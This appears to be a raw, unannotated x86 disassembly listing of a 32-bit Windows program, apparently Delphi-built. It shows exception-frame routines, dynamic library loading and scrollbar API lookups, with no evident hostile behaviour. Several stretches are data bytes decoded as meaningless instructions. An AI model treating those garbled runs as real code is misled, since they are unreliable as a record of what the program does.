adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
lodsd [ esi ]
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
imul esp [ ebp + 0x77 ] 0xa93c7265
inc edx
add [ ecx ] al
xchg bx ax
insd
and al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
mov al 0xe
jae r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0xa9787265
inc edx
add [ ecx ] al
xchg bx ax
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
outsb
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_4041b8
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a8c4
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jns r-xdata
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add [ edi ] cl
add bh bh
dec [ ebx + 0x42a97cc0 ]
imul ebp [ edi + 0x6e ] 0xdc00408d
stosb [ edi ]
inc edx
add [ eax ] al
add [ eax ] al
jae r-xdata
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
jmp r-xdata
int3
mov eax eax
outsd
outsb
je r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
inc [ eax - 0x57 ]
inc edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b66a
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404c00
lea eax [ ebp - 0x8 ]
call sub_405b04
retn
inc ebx
xor edi edi
lodsd [ esi ]
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
imul esp [ ebp + 0x77 ] 0x11247265
inc eax
add [ ecx ] al
xchg ebx eax
cld
jae r-xdata
adc eax 0x65705349
je r-xdata
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405b48
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
dec [ ebx + 0x42a90cc0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
insd
dec eax
insb
jo r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_429d40
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405b1c
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405b48
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42ac94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_42ad0a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_42ae20
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_405b1c
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ad11
lea eax [ ebp - 0x8 ]
call sub_405b04
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42adac
mov [ rw-data ] eax
sub_42ad18
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42adac
mov [ rw-data ] eax
mov ecx r-xdata
call sub_405b48
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42ad70
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_405b1c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_42adac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403338
mov dl 0x1
mov eax [ r-xdata ]
call sub_429d04
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429d04
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429d04
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_404164
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_42ae20
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42af21
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ad70
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_429d54
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_405b04
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d4a0
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405b04
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d4a0
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ad70
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_429d54
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ad70
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_429d54
mov ecx r-xdata
call sub_405b48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42af28
lea eax [ ebp - 0xc ]
call sub_405b04
lea eax [ ebp - 0x8 ]
call sub_405b04
retn
sub edx 0xfffffff8
sub_42af40
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_429d40
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42af80
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_429d40
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42afb0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42b142
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_429d40
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b0dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b149
lea eax [ ebp - 0x10 ]
call sub_404164
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_429d40
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
mov eax esi
xor edx edx
call sub_429d40
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_429d40
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403368
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_429d40
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_42b150
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push j_sub_403ae4#9
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_4041b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b23c
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404c00
lea eax [ ebp - 0x8 ]
call sub_405b04
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_429d40
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405b1c
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405b48
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_429d40
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405b1c
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405b48
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_42b46c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42b55f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_4041b8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b566
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404c00
lea eax [ ebp - 0x10 ]
call sub_405b04
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405b48
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_429d40
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_405b1c
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405b48
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42b584
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42b663
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_4041b8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b66a
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404c00
lea eax [ ebp - 0x8 ]
call sub_405b04
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405b48
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_429d40
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405b1c
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405b48
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42b684
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405b78
xor eax eax
push ebp
push sub_42b6d3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_405b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b6da
lea eax [ ebx + 0xc ]
call sub_405b04
sub_42b6e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_404614
xor eax eax
push ebp
push sub_42b775
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_4041b8
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42b46c
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b77c
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax ebx
call sub_42af80
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42afb0
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42b150
sub_42b7a0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_429d40
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_429d40
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_418790
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_429d40
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_418790
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_418790
sub_42b82c
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax esi
call sub_42af40
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403368
mov eax [ esi + 0x14 ]
call sub_403368
mov eax [ esi + 0x10 ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_405b04
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_42b880
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b8b7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b8be
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_42b8c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b8ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b8f4
retn
sub_42b900
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b931
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b938
retn
mov eax [ rw-data ]
call sub_403368
sub_42b944
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42b978
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42b9a0
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_42bc22
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bc49
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bc50
retn
sub_42bc64
mov al 0xbc
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x40042bc ] bh
add [ eax ] al
add [ eax - 0x67ffbff0 ] dh
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax ] dh
mov ebp 0xbd340042
inc edx
add [ esi ] cl
push esp
push ebx
jns r-xdata
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x14 ] si
mov ebp 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0xbd
inc edx
add [ eax + eax ] bl
add [ eax ] al
mov esp 0x35980042
inc eax
add [ ebp + esi + 0x35a80040 ] ah
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax - 0x43 ] bh
inc edx
add [ eax - 0x4bffbd43 ] ch
mov ebp 0x54100042
inc ebx
jb r-xdata
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
mov eax esi
call sub_403358
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
sub_42bd38
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403338
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_42bd78
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_42bdd0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bdf5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bdfc
retn
sub_42be08
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42bdc0
xor eax eax
push ebp
push sub_42bfbf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bfc6
mov eax [ rw-data ]
call sub_42bdc8
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_42bfc8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42bdc0
xor eax eax
push ebp
push sub_42c37b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c382
mov eax [ rw-data ]
call sub_42bdc8
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
